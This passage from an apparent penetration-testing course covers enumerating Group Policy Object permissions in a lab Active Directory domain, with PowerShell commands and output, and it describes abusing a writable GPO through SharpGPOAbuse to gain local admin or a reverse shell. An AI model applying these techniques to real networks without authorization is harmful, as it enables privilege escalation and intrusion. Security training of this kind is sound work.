This can be useful for us to start seeing what kind of security measures are in place (such as denying access to cmd.exe and a separate password policy for service accounts). We can see that auto-login is being used, which could mean there is a readable password in a GPO, and we can see that Active Directory Certificate Services (AD CS) are present in the domain. If Group Policy Management Tools are installed on the host we are working from, we can use various built-in [GroupPolicy cmdlets](https://docs.microsoft.com/en-us/powershell/module/grouppolicy/?view=windowsserver2022-ps), such as `Get-GPO`, to perform the same enumeration.

#### Enumerating GPO Names with a Built-in Cmdlet

```
PS C:\htb> Get-GPO -All | Select DisplayName

DisplayName
-----------
Certificate Services
Default Domain Policy
Disable NetBIOS
Disable Guest Account
AutoLogon
Default Domain Controllers Policy
Disconnect Idle RDP
Disallow LM Hash
Deny CMD Access
Block Removable Media
GuardAutoLogon
Service Accounts Password Policy
Logon Banner
Disable Forced Restarts
Deny Control Panel Access
```

Here we can check if a user we control has any rights over a GPO. Specific users or groups can be granted rights to administer one or more GPOs. A good first check is to see if the entire Domain Users group has any rights over one or more GPOs.

#### Enumerating GPO Rights for Domain Users

```
PS C:\htb> $sid=Convert-NameToSid "Domain Users"
PS C:\htb> Get-DomainGPO | Get-ObjectAcl | ?{$_.SecurityIdentifier -eq $sid}

ObjectDN              : CN={7CA9C789-14CE-46E3-A722-83F4097AF532},CN=Policies,CN=System,DC=INLANEFREIGHT,DC=LOCAL
ObjectSID             :
ActiveDirectoryRights : CreateChild, DeleteChild, ReadProperty, WriteProperty, Delete, GenericExecute, WriteDacl,
                        WriteOwner
BinaryLength          : 36
AceQualifier          : AccessAllowed
IsCallback            : False
OpaqueLength          : 0
AccessMask            : 983095
SecurityIdentifier    : S-1-5-21-3842939050-3880317879-2865463114-513
AceType               : AccessAllowed
AceFlags              : ObjectInherit, ContainerInherit
IsInherited           : False
InheritanceFlags      : ContainerInherit, ObjectInherit
PropagationFlags      : None
AuditFlags            : None
```

Here we can see that the Domain Users group has several permissions on a GPO, such as `WriteProperty` and `WriteDacl`, which we could exploit to gain full control over the GPO and carry out any number of attacks that would apply to all users and computers in the OUs where the GPO is applied. We can use the GPO's GUID combined with `Get-GPO` to view the GPO's display name.

#### Converting a GPO's GUID to its name

```
PS C:\htb Get-GPO -Guid 7CA9C789-14CE-46E3-A722-83F4097AF532

DisplayName      : Disconnect Idle RDP
DomainName       : INLANEFREIGHT.LOCAL
Owner            : INLANEFREIGHT\Domain Admins
Id               : 7ca9c789-14ce-46e3-a722-83f4097af532
GpoStatus        : AllSettingsEnabled
Description      :
CreationTime     : 10/28/2021 3:34:07 PM
ModificationTime : 4/5/2022 6:54:25 PM
UserVersion      : AD Version: 0, SysVol Version: 0
ComputerVersion  : AD Version: 0, SysVol Version: 0
WmiFilter        :
```
Checking in BloodHound, we can see that the `Domain Users` group has several rights over the `Disconnect Idle RDP` GPO, which could be leveraged to gain full control of the object.

![Graph showing DOMAIN USERS@INLANEFREIGHT.LOCAL with GenericWrite, WriteOwner, and WriteDacl permissions for DISCONNECT IDLE RDP@INLANEFREIGHT.LOCAL.](https://cdn.services-k8s.prod.aws.htb.systems/content/modules/143/gporights.png)

If we select the GPO in BloodHound and scroll down to `Affected Objects` in the `Node Info` tab, we can see that this GPO is applied to an OU containing four computer objects.

![Graph showing a GpLink from DISCONNECT IDLE RDP@INLANEFREIGHT.LOCAL to APPLICATION@INLANEFREIGHT.LOCAL, which contains several ACADEMY-EA-APP nodes.](https://cdn.services-k8s.prod.aws.htb.systems/content/modules/143/gpoaffected.png)

We could use a tool like [SharpGPOAbuse](https://github.com/FSecureLABS/SharpGPOAbuse) to exploit this GPO misconfiguration by performing actions such as adding a user we control to the local administrators group on one of the affected hosts, creating an immediate scheduled task on one of the hosts to give us a reverse shell, or setting up a malicious computer startup script to provide us with a reverse shell or similar. When using a tool like this, we must be careful because commands can be executed that affect all computers within the OU linked to the GPO. If we found an editable GPO applied to an OU with 1,000 computers, we wouldn't want to make the mistake of adding ourselves as local administrators to so many hosts. Some of the attack options available with this tool allow us to specify a target user or host. The hosts shown in the image above are not exploitable, and GPO attacks will be covered in depth in a later module.

---

## Moving Forward

We've seen several misconfigurations we might encounter during an assessment, and there are many more that will be covered in more advanced Active Directory modules. It's worth familiarizing yourself with as many attacks as possible, so we recommend researching topics such as:

- Active Directory Certificate Services (AD CS) attacks
- Kerberos constrained delegation  
- Kerberos unconstrained delegation  
- Kerberos resource-based constrained delegation (RBCD)